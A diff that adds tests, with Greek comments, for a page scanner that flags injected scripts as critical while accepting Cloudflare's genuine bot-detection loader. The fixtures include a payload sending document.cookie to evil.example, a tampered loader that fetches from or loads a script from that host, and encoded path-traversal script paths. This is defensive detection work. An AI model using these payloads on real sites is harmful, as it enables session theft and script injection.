@@ -417,3 +417,45 @@ test("πραγματική σελίδα: /admin/login του live site (χωρί
   const loader = `<script data-cfasync="false" nonce="${nonce}">try{(function(w,d){var s=d.createElement("script");s.src="/cdn-cgi/zaraz/s.js?z="+btoa(1);d.head.appendChild(s)})(window,document)}catch(e){throw fetch("/cdn-cgi/zaraz/t"),e;}</script>`;
   assert.equal(sev(scanPage(html.replace("</head>", `${loader}</head>`), ctx({ buildChunks: null }))), "critical");
 });
+
+// ── διορθώσεις αναθεώρησης 2 ─────────────────────────────────────────────────────────────────────────────────────────
+test("scanPage: /cdn-cgi/ «γνωστής λειτουργίας» από ξένο host ή με κωδικοποιημένη διαδρομή → critical", () => {
+  for (const src of [
+    "https://evil.example/cdn-cgi/challenge-platform/x.js",
+    "//evil.example/cdn-cgi/scripts/abc/cloudflare-static/email-decode.min.js",
+    "http://1.2.3.4/cdn-cgi/challenge-platform/x.js",
+    "/cdn-cgi/challenge-platform/..%2fzaraz/s.js",
+    "/cdn-cgi/challenge-platform/%2e%2e/zaraz/s.js",
+    "/%63dn-cgi/zaraz/s.js",
+  ]) assert.equal(sev(scanPage(page(`<script src="${src}"></script>`), ctx())), "critical", src);
+  // το γνήσιο email-decode από το δικό μας origin μένει warn
+  assert.equal(sev(scanPage(page(`<script data-cfasync="false" src="https://euronics.dgsoft.gr/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>`), ctx())), "warn");
+});
+
+/** Ο loader του Cloudflare JavaScript detections όπως τον βάζει το Cloudflare (Bot Fight Mode). */
+const JSD_REAL = `<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8f1a2b3c4d5e6f70',t:'MTcyOTQxMjM0NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>`;
+
+test("scanPage: εξαίρεση loader του Cloudflare μόνο για το γνωστό σχήμα του JSD", () => {
+  for (const html of [JSD_REAL, JSD_REAL.replace("<script>", '<script nonce="CFN">'), JSD_REAL.replace("<script>", '<script nonce="N1">')]) {
+    const f = scanPage(page(html), ctx());
+    assert.equal(sev(f), "warn", JSON.stringify(f));
+  }
+  const evil = "new Image().src='https://evil.example/c?'+document.cookie /* /cdn-cgi/challenge-platform/ */";
+  for (const tag of ["<script>", '<script nonce="CFN">', '<script nonce="N1">']) {
+    assert.equal(sev(scanPage(page(`${tag}${evil}</script>`), ctx())), "critical", tag);
+  }
+  // σχήμα JSD αλλά με επιπλέον αποστολή σε ξένο host / cookie / άλλο src → critical
+  for (const bad of [
+    JSD_REAL.replace("})();</script>", ";fetch('https://evil.example/x')})();</script>"),
+    JSD_REAL.replace("a.nonce='';", "a.nonce='';x=document.cookie;"),
+    JSD_REAL.replace("a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js'", "a.src='https://evil.example/main.js?/cdn-cgi/challenge-platform/scripts/jsd/main.js'"),
+    JSD_REAL.replace("})();</script>", `})();${"/*x*/".repeat(500)}</script>`),
+  ]) {
+    assert.notEqual(bad, JSD_REAL);
+    assert.equal(sev(scanPage(page(bad), ctx())), "critical", bad.slice(-120));
+  }
+});
+
+test("scanPage: δική μας διαδρομή με κωδικοποιημένο «..» → critical ακόμη και χωρίς λίστα build", () => {
+  assert.equal(sev(scanPage(page(`<script src="/_next/static/..%2f..%2fuploads/x.js" nonce="N1"></script>`), ctx({ buildChunks: null }))), "critical");
+});
